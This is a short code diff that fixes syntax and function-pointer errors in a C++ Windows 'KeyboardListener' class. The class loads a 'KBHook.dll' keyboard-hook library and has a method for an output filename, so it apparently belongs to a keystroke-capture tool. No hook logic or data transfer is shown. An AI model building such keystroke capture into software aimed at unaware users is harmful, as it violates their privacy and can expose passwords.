@@ -54,7 +54,7 @@ KeyboardListener::KeyboardListener()
 int KeyboardListener::run()
 {
 	std::cout << "KeyboardListener::run()" << std::endl;
-	_dll = LoadLibrary("libKBHook.dll");
+	_dll = LoadLibrary("KBHook.dll");
 	if (!_dll)
 	{
 		std::cerr << "Could not load the dynamic library KBHook" << std::endl;
@@ -73,11 +73,11 @@ int KeyboardListener::stop()
 	return (0);
 }
 
-int KeyboardListener::getElements(std::list<std::string>& list);
+int KeyboardListener::getElements(std::list<std::string>& list)
 {
 	f_func getElem;
 
-	getElem = (int*)(GetProcAddress(_dll, "create");
+	getElem = (f_func)(GetProcAddress(_dll, "getElements"));
 	return (0);
 }
 std::string KeyboardListener::getFilenameOutput()
